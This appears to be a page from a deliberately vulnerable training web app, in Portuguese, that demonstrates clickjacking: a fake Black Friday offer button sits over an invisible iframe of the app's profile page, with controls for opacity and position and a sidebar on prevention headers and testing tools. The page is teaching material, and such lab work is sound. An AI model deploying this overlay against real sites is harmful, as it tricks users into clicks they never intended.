<?php
defined('APP') or die('Access denied');
?>

<div class="container mt-4">
    <h3>🎯 Clickjacking Attack Demo</h3>

    <div class="alert alert-danger" role="alert">
        <strong>⚠️ Aviso:</strong> Esta página demonstra um ataque de Clickjacking para fins educacionais!
    </div>

    <div class="row mb-4">
        <div class="col-md-8">
            <div class="card">
                <div class="card-header">
                    <h5>🛍️ Black Friday - Promoção Imperdível!</h5>
                </div>
                <div class="card-body">
                    <!-- Controles FORA da área de demonstração -->
                    <div class="mb-3">
                        <div class="row">
                            <div class="col-md-6">
                                <h6>🎛️ Transparência:</h6>
                                <div class="btn-group" role="group">
                                    <button type="button" class="btn btn-outline-secondary" onclick="setOpacity(0)">0%</button>
                                    <button type="button" class="btn btn-outline-warning" onclick="setOpacity(40)">40%</button>
                                    <button type="button" class="btn btn-outline-danger" onclick="setOpacity(100)">100%</button>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <h6>📐 Posicionamento:</h6>
                                <div class="row g-2">
                                    <div class="col-6">
                                        <label class="form-label" style="font-size: 0.8rem;">Top (px):</label>
                                        <input type="number" id="topInput" class="form-control form-control-sm" value="55" onchange="updatePosition()">
                                    </div>
                                    <div class="col-6">
                                        <label class="form-label" style="font-size: 0.8rem;">Left (px):</label>
                                        <input type="number" id="leftInput" class="form-control form-control-sm" value="0" onchange="updatePosition()">
                                    </div>
                                </div>
                            </div>
                        </div>


                        <div class="alert alert-info mt-2" role="alert">
                            <small><strong>💡 Instruções:</strong> Ajuste transparência e posição para alinhar o iframe sobre elementos específicos.</small>
                        </div>
                    </div>

                    <!-- Área de demonstração do ataque -->
                    <div id="clickjackingDemo" style="position: relative; height: 400px; border: 2px dashed #dc3545; overflow: hidden; background: #f8f9fa;">
                        <!-- Conteúdo visível (isca) -->
                        <div style="position: absolute; z-index: 1; padding: 20px; pointer-events: none;">
                            <h4>🔥 MEGA PROMOÇÃO BLACK FRIDAY!</h4>
                            <p class="lead">Grande oportunidade! Nossa Black Friday está de volta com promoções incríveis!</p>
                            <img src="img/black-friday.gif" alt="Black Friday" style="max-width: 300px; height: 150px; object-fit: cover;">
                            <br><br>
                            <button class="btn btn-danger" style="pointer-events: auto; padding: 5px 15px; margin-left:18px; font-size: 20px; font-weight: bold; border-radius: 8px;">
                                Garantir Oferta!
                            </button>
                        </div>

                        <!-- iframe oculto (ataque) -->
                        <iframe id="hiddenFrame"
                            style="position: absolute; top: 55px; left: 0; opacity: 0; z-index: 999; border: 2px solid red;"
                            src="/?page=profile"
                            width="100%"
                            height="100%">
                        </iframe>
                    </div>
                </div>
            </div>
        </div>

        <div class="col-md-4">
            <div class="card">
                <div class="card-header">
                    <h6>🎯 Como Funciona o Clickjacking</h6>
                </div>
                <div class="card-body">
                    <div class="accordion" id="clickjackingInfo">
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="headingMechanism">
                                <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapseMechanism">
                                    Mecanismo do Ataque
                                </button>
                            </h2>
                            <div id="collapseMechanism" class="accordion-collapse collapse show" data-bs-parent="#clickjackingInfo">
                                <div class="accordion-body">
                                    <ol>
                                        <li><strong>Iframe Oculto:</strong> Página legítima carregada invisível</li>
                                        <li><strong>Sobreposição:</strong> Conteúdo atrativo por cima</li>
                                        <li><strong>Posicionamento:</strong> Botões alinhados estrategicamente</li>
                                        <li><strong>Click Interceptado:</strong> Usuário clica sem saber</li>
                                    </ol>
                                </div>
                            </div>
                        </div>

                        <div class="accordion-item">
                            <h2 class="accordion-header" id="headingPrevention">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapsePrevention">
                                    Prevenção
                                </button>
                            </h2>
                            <div id="collapsePrevention" class="accordion-collapse collapse" data-bs-parent="#clickjackingInfo">
                                <div class="accordion-body">
                                    <strong>Headers de Segurança:</strong><br>
                                    <code>X-Frame-Options: DENY</code><br>
                                    <code>X-Frame-Options: SAMEORIGIN</code><br><br>

                                    <strong>CSP (Content Security Policy):</strong><br>
                                    <code>frame-ancestors 'none';</code><br>
                                    <code>frame-ancestors 'self';</code><br><br>

                                    <strong>JavaScript Frame Busting:</strong><br>
                                    <code>if (top !== self) top.location = self.location;</code>
                                </div>
                            </div>
                        </div>

                        <div class="accordion-item">
                            <h2 class="accordion-header" id="headingTools">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseTools">
                                    Ferramentas de Teste
                                </button>
                            </h2>
                            <div id="collapseTools" class="accordion-collapse collapse" data-bs-parent="#clickjackingInfo">
                                <div class="accordion-body">
                                    <ul>
                                        <li>🔧 <strong>Burp Suite:</strong> Scanner automático</li>
                                        <li>🕷️ <strong>OWASP ZAP:</strong> Proxy de segurança</li>
                                        <li>🌐 <strong>Browser DevTools:</strong> Inspeção manual</li>
                                        <li>📝 <strong>Manual Testing:</strong> Iframe em HTML</li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="mt-3">
                        <h6>⚡ Status Atual:</h6>
                        <div class="alert alert-info" role="alert">
                            <small id="frameStatus">Iframe invisível (0% opacidade)</small>
                        </div>

                        <h6>🔧 Debug Console:</h6>
                        <div class="d-grid gap-1">
                            <button class="btn btn-sm btn-outline-dark" onclick="debugClickjacking()">🔍 Mostrar Info no Console</button>
                            <small class="text-muted">Pressione F12 para abrir o Console do navegador</small>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    function setOpacity(percentage) {
        console.log(`🎛️ Alterando opacidade para ${percentage}%`);

        const frame = document.getElementById("hiddenFrame");
        const status = document.getElementById("frameStatus");

        if (!frame) {
            console.error("❌ Elemento hiddenFrame não encontrado!");
            alert("Erro: iframe não encontrado!");
            return;
        }

        // Definir opacidade
        frame.style.opacity = (percentage / 100).toString();
        console.log(`✅ Opacidade definida: ${frame.style.opacity}`);

        // Atualizar status
        updateStatus();

        if (status) {
            const statusDiv = status.parentElement;

            if (percentage === 0) {
                statusDiv.className = "alert alert-danger";
            } else if (percentage === 40) {
                statusDiv.className = "alert alert-warning";
            } else if (percentage === 100) {
                statusDiv.className = "alert alert-success";
            }
        }
    }

    function debugClickjacking() {
        const frame = document.getElementById("hiddenFrame");

        console.log("=== 🔍 DEBUG CLICKJACKING ===");
        console.log("Frame elemento:", frame);
        console.log("Frame existe:", !!frame);

        if (frame) {
            console.log("Opacidade atual:", frame.style.opacity);
            console.log("Z-index:", frame.style.zIndex);
            console.log("Posição:", frame.style.position);
            console.log("Dimensões:", frame.style.width, "x", frame.style.height);
            console.log("Estilo completo:", frame.style.cssText);
        }

        console.log("=== FIM DEBUG ===");
    }

    // Funções de posicionamento
    function updatePosition() {
        const frame = document.getElementById("hiddenFrame");
        const topInput = document.getElementById("topInput");
        const leftInput = document.getElementById("leftInput");

        if (frame && topInput && leftInput) {
            const top = topInput.value + "px";
            const left = leftInput.value + "px";

            frame.style.top = top;
            frame.style.left = left;

            console.log(`📐 Posição atualizada: top=${top}, left=${left}`);
            updateStatus();
        }
    }

    function setPosition(top, left) {
        const frame = document.getElementById("hiddenFrame");
        const topInput = document.getElementById("topInput");
        const leftInput = document.getElementById("leftInput");

        if (frame && topInput && leftInput) {
            topInput.value = top;
            leftInput.value = left;

            frame.style.top = top + "px";
            frame.style.left = left + "px";

            console.log(`🎯 Posição rápida definida: top=${top}px, left=${left}px`);
            updateStatus();
        }
    }

    function updateStatus() {
        const status = document.getElementById("frameStatus");
        const frame = document.getElementById("hiddenFrame");

        if (status && frame) {
            const opacity = Math.round(parseFloat(frame.style.opacity || 0) * 100);
            const top = frame.style.top || "0px";
            const left = frame.style.left || "0px";

            status.innerHTML = `🎯 Iframe: ${opacity}% opacidade, posição (${top}, ${left})`;
        }
    }

    // Configurar página ao carregar
    document.addEventListener('DOMContentLoaded', function() {
        console.log("🚀 Página carregada, inicializando clickjacking demo...");

        const frame = document.getElementById("hiddenFrame");
        if (frame) {
            frame.style.opacity = "0";
            console.log("✅ Opacidade inicial definida para 0");
            updateStatus();
        } else {
            console.error("❌ Iframe não encontrado no carregamento!");
        }
    });
</script>